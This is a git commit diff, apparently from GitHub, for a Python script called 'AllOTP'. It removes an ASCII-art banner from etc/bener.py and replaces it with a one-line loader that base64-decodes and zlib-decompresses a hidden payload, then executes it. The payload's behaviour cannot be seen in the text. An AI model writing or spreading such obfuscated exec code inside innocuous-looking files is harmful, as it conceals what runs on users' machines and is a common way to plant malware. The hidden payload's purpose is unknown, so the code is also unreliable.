2250683601bdfeba97a7779ffb45a9cc0569a60c
Rayhan-Z75 <76443273+Rayhan-Z75@users.noreply.github.com>
2021-01-01 15:13:10 +0700

    Add files via upload

--- etc/bener.py
+++ etc/bener.py
@@ -1,19 +1,2 @@
-from warn.warn import *
-# -*- coding: utf-8 -*-
-def bnr():
- print (f"""
-{ken}    ______   _______     _       ____    ____  
-{kon}  .' ____ \ |_   __ \   / \     |_   \  /   _| 
-{ken}  | (___ \_|  | |__) | / _ \      |   \/   |   
-{kon}   _.____`.   |  ___/ / ___ \     | |\  /| |   
-{ken}  | \____) | _| |_  _/ /   \ \_  _| |_\/_| |_  
-{kon}   \______.'|_____||____| |____||_____||_____| 
-       {im}╔═╗┬  ┬{anj}    {im}╔═╗┌─┐┬─┐  {anj}╔═╗┌┐┌┌─┐
-       {anj}╠═╣│  │{im}    {anj}╠╣ │ │├┬┘  {im}║ ║│││├┤ 
-       {im}╩ ╩┴─┘┴─┘{anj}  {im}╚  └─┘┴└─  {anj}╚═╝┘└┘└─┘
-{im}••••••••••••••••••••••••••••••••••••••••••••••••••••••
-{kun}[$] Author   : {kin}RayhanGanz
-{kun}[$] Nama SC  : {kin}AllOTP
-{kun}[$] Github   : {kin}https://github.com/RayhanZ75
-{kun}[$] Facebook : {kin}RAyhan GANZ
-{im}••••••••••••••••••••••••••••••••••••••••••••••••••••••""")
+import marshal,zlib,base64
+exec(zlib.decompress(base64.b64decode("eJzVVMFKw0AQvecrhirYCk1OovRWBHurop40EtPa2thmU2KKaBOQnj1U2GIRBVEvgke/aL/EmdlsquIH6JLMzM68N292CenGUQgXfixsMhCEwyhOYNVagupqFdrRSSBOazBKutUNylgnnS60RFyu1CwYxoFIoNwtlUrWuN8RGeDyeBUBRRiDXiahPZIiItkrOuFCqokYAThsQedc2mMpBaOUQpk5mMI49bwKOge8nIUbZDl5YJTAs0np2NZ5DB3ieIaFjUgpNaRcySUS9fdSHodZNJTrgc65Tl4qlFx9fHslZZ+y40HNpnBg5dczDsJMzaSaTdXsTsl3ADRjX5xlv1RvlLxWcooIHSCAkN8RU7Y5tJDRuCfGvSg5IZ0Jtf9efaE0vUo+sMzcDHEL+HJhYsqvP07xhpA3JT9Yel4E+Wk05p6E5RcExcUE9zzfI9eksQS1mH39/Mcf/BRGIjtcPoL6KOlFMV5NDcb9QGS7/mXPFw1fXC0wTT/0YW+zwNQHg+39nUW9ESS9UWvRo5ckw/Oa45xy3m5HoaPbHqyvLVhbfrvTiqJ+oVwnCDTqzYN/cov4c6lYn+cTJdE=")))
